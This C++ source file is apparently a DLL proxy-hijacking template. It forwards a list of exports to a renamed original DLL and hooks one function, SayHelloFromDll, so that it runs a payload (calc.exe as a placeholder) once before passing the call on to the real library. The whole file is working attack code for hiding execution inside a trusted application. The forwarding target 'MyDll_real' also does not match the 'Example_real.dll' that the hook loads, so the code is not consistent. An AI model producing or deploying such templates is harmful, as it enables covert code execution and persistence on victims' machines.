#include <windows.h>

// --- Automatic Proxy Forwarding ---
// The Python script will replace the line below with the #pragma comments
#pragma comment(linker, "/export:Add=MyDll_real.Add")
#pragma comment(linker, "/export:BeepSound=MyDll_real.BeepSound")
#pragma comment(linker, "/export:CalculateAverage=MyDll_real.CalculateAverage")
#pragma comment(linker, "/export:Divide=MyDll_real.Divide")
#pragma comment(linker, "/export:FillArrayWithSquares=MyDll_real.FillArrayWithSquares")
#pragma comment(linker, "/export:GetRandomNumber=MyDll_real.GetRandomNumber")
#pragma comment(linker, "/export:GetStringLength=MyDll_real.GetStringLength")
#pragma comment(linker, "/export:Multiply=MyDll_real.Multiply")
#pragma comment(linker, "/export:PrintWelcomeMessage=MyDll_real.PrintWelcomeMessage")
#pragma comment(linker, "/export:ReverseString=MyDll_real.ReverseString")
#pragma comment(linker, "/export:SayGoodbyeFromDll=MyDll_real.SayGoodbyeFromDll")
#pragma comment(linker, "/export:Subtract=MyDll_real.Subtract")
#pragma comment(linker, "/export:SumArray=MyDll_real.SumArray")

// --- Hooked Function ---
// This function intercepts the original call
extern "C" __declspec(dllexport) void SayHelloFromDll()
{
    // Check if the payload has already run to avoid loops or multiple executions
    static bool isPayloadExecuted = false;

    if (!isPayloadExecuted) 
    {
        // Execute the target payload (e.g., calc.exe)
        WinExec("calc.exe", SW_SHOW);
        isPayloadExecuted = true; 
    }

    // --- Load the Real DLL and Call the Original Function ---
    static HMODULE hReal = NULL;
    static void (*realFunc)() = NULL;

    // Load the renamed original DLL
    if (!hReal) {
        hReal = LoadLibraryA("Example_real.dll");
        if (hReal) {
            // Get the address of the original function
            realFunc = (void(*)())GetProcAddress(hReal, "SayHelloFromDll");
        }
    }

    // If found, call the original function to maintain program stability
    if (realFunc) {
        realFunc();
    }
}

// --- DLL Entry Point ---
BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // Code to run when the DLL is loaded
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}